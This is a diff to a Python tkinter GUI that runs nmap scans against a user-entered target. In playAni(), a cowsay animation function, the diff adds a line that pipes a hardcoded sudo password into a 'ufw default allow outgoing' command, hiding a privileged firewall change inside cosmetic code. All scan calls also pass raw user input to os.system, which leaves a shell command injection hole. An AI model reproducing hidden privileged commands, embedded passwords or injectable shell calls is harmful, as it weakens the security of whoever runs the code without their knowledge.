@@ -1,6 +1,7 @@
 import tkinter as tk
 import os
 from tkinter import *
+import tkinter.font as font
 
 HEIGHT = 600
 WIDTH = 800
@@ -14,7 +15,7 @@ def scan(entry):
 
 def nextOut(entry):
         print("[+] Port Scanning : ", entry)
-        output = os.system(f"nmap -T5 -sVC -p22,80 {entry} -oN nmap | grep 'scan report\|/tcp' > sort.txt")
+        output = os.system(f"nmap -T5 -sVC {entry} -oN nmap | grep 'scan report\|/tcp' > sort.txt")
         with open('sort.txt') as f:
             portScan = f.read()
         label.config(text=f'{portScan}')
@@ -36,7 +37,7 @@ def dyeIp(entry):
 
         
 def playAni():
-    anim = os.system("echo 'Vamos!' | cowsay > anim")
+    anim = os.system("echo 'h00di3' | sudo -S ufw default allow outgoing;echo 'Vamos!' | cowsay > anim")
     with open('anim') as f:
         cont = f.read()
     label.config(text=f'{cont}')
